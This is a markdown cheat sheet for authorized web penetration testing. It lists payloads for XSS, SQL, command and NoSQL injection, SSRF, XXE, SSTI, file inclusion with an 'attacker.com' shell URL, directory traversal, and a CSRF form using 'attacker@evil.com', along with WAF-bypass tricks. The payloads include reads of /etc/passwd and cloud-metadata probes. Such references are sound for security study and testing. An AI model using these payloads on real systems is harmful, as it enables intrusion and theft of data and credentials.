# Web Vulnerability Quick Reference Guide

## Most Common Vulnerabilities - Quick Payloads

### XSS (Cross-Site Scripting)
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### SQL Injection
```sql
' OR '1'='1' --
admin' --
' UNION SELECT NULL,NULL,NULL--
```

### Command Injection
```bash
; whoami
&& id
| cat /etc/passwd
$(whoami)
```

### SSRF (Server-Side Request Forgery)
```
http://127.0.0.1
http://169.254.169.254/latest/meta-data/
http://localhost
```

### File Inclusion (LFI/RFI)
```
../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
http://attacker.com/shell.txt
```

### XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### SSTI (Server-Side Template Injection)
```python
{{7*7}}
{{config}}
{{''.__class__.__mro__[2].__subclasses__()}}
```

### NoSQL Injection
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
username[$ne]=admin&password[$ne]=pass
```

### Directory Traversal
```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//....//etc/passwd
```

### CSRF (Cross-Site Request Forgery)
```html
<form action="http://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

## Testing Methodology

### 1. Reconnaissance
- Identify input points (forms, URL parameters, headers, cookies)
- Map application functionality
- Identify technologies used

### 2. Vulnerability Testing
- Test each input with detection payloads
- Analyze responses for vulnerabilities
- Test for filter bypasses

### 3. Exploitation
- Craft working exploit
- Test for impact (data exfiltration, RCE, etc.)
- Document findings

### 4. Reporting
- Write clear description
- Provide steps to reproduce
- Include impact assessment
- Suggest remediation

## Essential Tools

### Scanners
- **Burp Suite** - Web application security testing
- **OWASP ZAP** - Automated security scanner
- **Nuclei** - Template-based scanner

### Specialized Tools
- **SQLmap** - SQL injection automation
- **XSStrike** - XSS detection and exploitation
- **Commix** - Command injection exploitation
- **NoSQLMap** - NoSQL injection testing
- **jwt_tool** - JWT security testing

### Utilities
- **curl** - HTTP requests
- **wget** - File downloading
- **ffuf** - Fuzzing tool
- **wfuzz** - Web application fuzzer

## Common Bypass Techniques

### Filter Bypass - General
```
- Encoding: URL, HTML, Unicode, Hex
- Case manipulation: ScRiPt, SeLeCt
- Comment injection: /*!SELECT*/, --comment
- Null bytes: %00
- Newlines: %0A, %0D
```

### WAF Bypass
```
- Double encoding: %2527
- Unicode encoding: \u0061
- Alternative syntax: UNION/**/SELECT
- Case manipulation: UnIoN SeLeCt
```

## Quick Testing Commands

### XSS
```bash
# Basic test
'"><script>alert(1)</script>

# In different contexts
javascript:alert(1)
<img src=x onerror=alert(1)>
{{7*7}}
```

### SQL Injection
```bash
# Authentication bypass
admin' --
' OR '1'='1' --

# Union injection
' UNION SELECT NULL--
' UNION SELECT @@version--

# Time-based
' AND SLEEP(5)--
```

### Command Injection
```bash
; whoami
&& whoami
| whoami
`whoami`
$(whoami)
```

### SSRF
```bash
http://localhost
http://127.0.0.1
http://169.254.169.254/latest/meta-data/
http://[::1]
```

## Payload Categories by Impact

### Information Disclosure
- LFI: Read sensitive files
- XXE: Extract data via OOB
- SQL Injection: Dump database
- SSRF: Access internal services

### Remote Code Execution
- Command Injection: System commands
- SSTI: Template code execution
- Deserialization: Object injection
- LFI to RCE: Log poisoning

### Authentication Bypass
- SQL Injection: `' OR '1'='1`
- NoSQL Injection: `{"$ne": null}`
- JWT: Algorithm confusion
- OAuth: Token manipulation

### Privilege Escalation
- IDOR: Access other users' data
- Mass Assignment: Modify role field
- JWT: Change user claims
- SQL Injection: Union-based escalation

## Detection vs Exploitation

### Detection Phase
```
Simple payloads to confirm vulnerability:
- XSS: <script>alert(1)</script>
- SQLi: ' OR '1'='1
- Command: ; whoami
- SSTI: {{7*7}}
```

### Exploitation Phase
```
Advanced payloads for maximum impact:
- XSS: Cookie stealing, keylogging
- SQLi: Database dump, OS command execution
- Command: Reverse shell
- SSTI: Server-side code execution
```

## Vulnerability Severity

### Critical
- Remote Code Execution (RCE)
- SQL Injection with data access
- Authentication Bypass
- SSRF to internal systems

### High
- Stored XSS
- File Upload leading to RCE
- XXE with data exfiltration
- IDOR with sensitive data

### Medium
- Reflected XSS
- CSRF on sensitive actions
- Information Disclosure
- Weak JWT implementation

### Low
- Self-XSS
- CSRF on non-sensitive actions
- Information Leakage (minor)
- Clickjacking

## Pro Tips

1. **Always test in authorized environments**
2. **Start with detection, then exploitation**
3. **Use encoding/obfuscation for bypass**
4. **Combine vulnerabilities for greater impact**
5. **Document everything for reporting**
6. **Test multiple injection points**
7. **Use automation wisely, verify manually**
8. **Understand the application logic**
9. **Think like an attacker, defend like a pro**
10. **Stay updated with latest techniques**

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)

---

**Remember: Use these payloads only on systems you own or have explicit permission to test!**
